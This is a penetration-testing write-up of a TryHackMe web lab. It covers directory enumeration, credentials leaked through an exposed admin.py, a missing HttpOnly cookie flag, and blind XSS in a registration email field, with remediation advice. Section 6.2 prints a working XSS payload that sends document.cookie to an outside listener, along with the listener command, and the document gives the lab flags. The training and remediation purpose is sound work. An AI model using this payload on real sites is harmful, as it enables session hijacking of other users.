# What's Your Name? — Penetration Testing Writeup

## 1. Overview

- **Platform:** TryHackMe
- **Target:** `worldwap.thm`
- **Difficulty:** Medium
- **Category:** Web Application Security
- **Assessment Date:** October 11, 2026
- **Methodology:** PTES-inspired workflow
- **Status:** Completed

### Objective

Assess the target web application by identifying exposed resources, investigating authentication controls, and evaluating whether client-side exploitation could compromise privileged application sessions.

### Summary

The assessment identified an exposed `admin.py` resource during directory enumeration. The discovered information provided credentials that successfully authenticated to the application's login page, allowing access to the admin panel and its flag.

Further investigation identified a cookie configuration issue: the session cookie was accessible to JavaScript because the `HttpOnly` attribute was absent. A blind cross-site scripting (XSS) payload submitted through the registration email field was subsequently triggered in a moderator's browser. The payload sent the moderator's cookie to a listener controlled by the tester, enabling moderator-session compromise and retrieval of the moderator flag.

**Flags obtained:**
- Admin panel: `AdM!nP@wnEd`
- Moderator: `ModP@wnEd`

## 2. Scope and Environment

- **Target IP:** `10.49.167.208`
- **Target hostname:** `worldwap.thm`
- **Operating system:** Kali Linux
- **Tools:** Rustscan, Dirsearch, web browser, Burp Suite, Python 3 HTTP server
- **In-scope services:** The target's exposed web applications and associated functionality on ports 80 and 8081, as provided by the TryHackMe lab.
- **Authorization:** Controlled TryHackMe training environment.

## 3. Reconnaissance

### 3.1 Port discovery

Rustscan was used to identify accessible TCP ports.

```bash
rustscan -a 10.49.167.208
```

**Observed open ports:**

| Port | Initial interpretation |
|---|---|
| 22 | Potential SSH service |
| 80 | HTTP web service |
| 8081 | HTTP web service on an alternate port |

These results identified the primary web attack surface for further enumeration. The specific service versions were not included in the evidence recorded here.

## 4. Enumeration

### 4.1 Directory and file discovery

Dirsearch was run against both HTTP ports.

```bash
dirsearch -u http://10.49.167.208:80/
dirsearch -u http://10.49.167.208:8081/
```

**Notable results:**

| Resource | HTTP status | Observation |
|---|---:|---|
| `/admin.py` | 200 | Returned approximately 5 KB of content; investigation led to credential discovery |
| `/login.php` | 200 | Login page accessible |
| `/chat.php` | 302 | Redirected to `login.php` |
| `/profile.php` | 302 | Redirected to `login.php` |
| `/logout.php` | 302 | Redirected to `login.php` |
| `/db.php` | 200 | Returned an empty response body according to Dirsearch |
| `/logs.txt` | 200 | Returned an empty response body according to Dirsearch |
| `/setup.php` | 200 | Returned approximately 96 bytes |
| `/phpmyadmin/` | 200 | phpMyAdmin interface accessible |
| `/assets/` | 200 | Directory returned a response |
| `/__pycache__/` | 301 | Redirected to the trailing-slash path |
| `/server-status` | 403 | Access forbidden |
| Several `.htaccess`-related paths | 403 | Access forbidden |

A `200 OK` response means the server returned a successful HTTP response; it does not automatically mean the resource contains sensitive information or is vulnerable. Each resource must be inspected to determine its actual significance.

### 4.2 Credential discovery and admin authentication

During investigation of `/admin.py`, I discovered credentials. I then navigated to `/login.php` and tested those credentials.

**Result:** The credentials were accepted, and I gained access to the admin panel. I retrieved the admin flag:

`AdM!nP@wnEd`

**Security significance:** An exposed resource that discloses valid credentials can allow unauthorized access to privileged functionality. The exact root cause should be confirmed by reviewing the resource's contents and how it was served.

*Evidence to attach:* A redacted screenshot of the relevant `/admin.py` response, the successful login, and the admin flag. Do not publish actual passwords or session tokens.

## 5. Vulnerability Identification

### 5.1 Exposed credential disclosure

**Affected resource:** `/admin.py`

**Evidence:** Investigation of the resource led to credentials that successfully authenticated to `/login.php`.

**Impact:** An attacker able to access the exposed information could use the credentials to access the associated account, potentially reaching administrative functionality.

**Recommended remediation:**
- Prevent source files and internal application resources from being exposed unintentionally.
- Keep credentials in secure configuration or secret-management systems rather than publicly accessible files.
- Rotate any exposed credentials and review relevant access logs.
- Enforce least privilege and strong authentication for administrative accounts.

### 5.2 Missing `HttpOnly` cookie attribute

During inspection of the web application's cookies, I observed that the relevant cookie did not have the `HttpOnly` attribute.

**Security significance:** Without `HttpOnly`, client-side JavaScript can read the cookie through browser APIs such as `document.cookie`, provided the cookie is otherwise accessible to the current script. This can increase the impact of an XSS vulnerability if a session cookie is exposed.

The absence of `HttpOnly` is a security weakness, but it does not independently establish that XSS exists. The subsequent blind XSS test provided additional evidence of exploitability.

**Recommended remediation:**
- Set `HttpOnly` on session cookies.
- Set `Secure` when the application is served over HTTPS.
- Configure an appropriate `SameSite` policy.
- Regenerate or invalidate sessions when compromise is suspected.
- Treat cookie flags as defense in depth, not as a substitute for fixing XSS.

### 5.3 Blind cross-site scripting (XSS)

**Affected functionality:** Registration form, specifically the email input.

**Observed behavior:** The application required moderator approval for a new registration. I submitted an XSS payload through the email field and started a Python HTTP server to receive the callback. The payload executed in the moderator's browser and transmitted the cookie to the listener.

**Result:** The callback provided the moderator's session information, which I used to access the moderator context and retrieve the moderator flag:

`ModP@wnEd`

**Security impact:** The application allowed user-supplied input to trigger JavaScript in another user's browser. In this case, the affected user was a moderator, and the execution exposed session information. This could permit unauthorized access to privileged functionality.

**Recommended remediation:**
- Apply context-appropriate output encoding wherever user-controlled values are rendered.
- Validate input as appropriate, but do not rely on input validation alone to prevent XSS.
- Avoid unsafe DOM operations and dangerous HTML insertion patterns.
- Use a restrictive Content Security Policy as an additional defense.
- Set session cookies to `HttpOnly`, `Secure` where applicable, and an appropriate `SameSite` value.
- Review moderator workflows that render submitted registration information.
- Invalidate potentially compromised sessions and review application logs.

## 6. Exploitation

### 6.1 Admin panel access

1. Enumerated web resources using Dirsearch.
2. Investigated `/admin.py`.
3. Discovered credentials.
4. Navigated to `/login.php`.
5. Authenticated successfully using the discovered credentials.
6. Retrieved the admin flag.

**Outcome:** Admin access confirmed.

### 6.2 Blind XSS and moderator-session compromise

1. Registered an account through `/public/html/register.php`.
2. Observed that the registration required moderator approval.
3. Inspected the application's cookie configuration and observed the missing `HttpOnly` attribute.
4. Started a Python HTTP server on port 4000 to receive a callback.
5. Submitted a blind XSS payload through the registration email field.
6. The payload executed in the moderator's browser and sent cookie data to the listener.
7. Used the obtained moderator session to access the moderator context.
8. Retrieved the moderator flag.

The payload used in the authorized lab was:

```html
<img src=x onerror="window.location='http://10.49.73.228:4000?'+document.cookie;">
```

The listener was started with:

```bash
python3 -m http.server 4000
```

**Outcome:** Blind XSS execution and moderator-session compromise confirmed in the lab.

**Evidence to attach:** The registration submission, the listener callback with sensitive values redacted, the resulting moderator access, and the flag retrieval. Avoid publishing a live session cookie or reusable session identifier.

## 7. Post-Exploitation

The assessment demonstrated access to two privilege contexts:

- **Admin:** Accessed using credentials discovered through `/admin.py`.
- **Moderator:** Accessed after blind XSS exposed session information from the moderator's browser.

The evidence provided confirms access to these contexts and retrieval of the corresponding flags. It does not establish broader server compromise, SSH access, database extraction, or operating-system-level access; those should not be claimed unless separately tested and documented.

## 8. Remediation Summary

| Finding | Recommended priority | Primary remediation |
|---|---|---|
| Exposed credential disclosure | High | Remove unintended exposure, rotate credentials, and review access logs |
| Missing `HttpOnly` cookie attribute | Medium | Set `HttpOnly` and review other session-cookie protections |
| Blind XSS in registration workflow | High | Fix unsafe rendering through context-aware output encoding and safe DOM practices |

These are preliminary priorities based on the demonstrated impact, not formal CVSS ratings. A production assessment should determine severity using the actual application context, exploit prerequisites, and business impact.

## 9. Lessons Learned

- Directory enumeration can reveal application resources that expose sensitive information.
- HTTP status codes provide useful leads, but each result needs manual verification.
- Credentials discovered in an exposed resource can provide a direct path to privileged application access.
- User-controlled input may become dangerous when rendered later in another user's browser, even when the original user does not immediately see the result.
- Missing cookie protections can amplify the impact of client-side vulnerabilities.
- Moderator approval workflows should be tested because submitted data may be viewed by privileged users.
- Evidence-driven documentation helps distinguish confirmed exploitation from assumptions.

## 10. References

- Penetration Testing Execution Standard (PTES): https://www.pentest-standard.org/
- OWASP Web Security Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- OWASP Cross Site Scripting Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- OWASP Session Management Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html

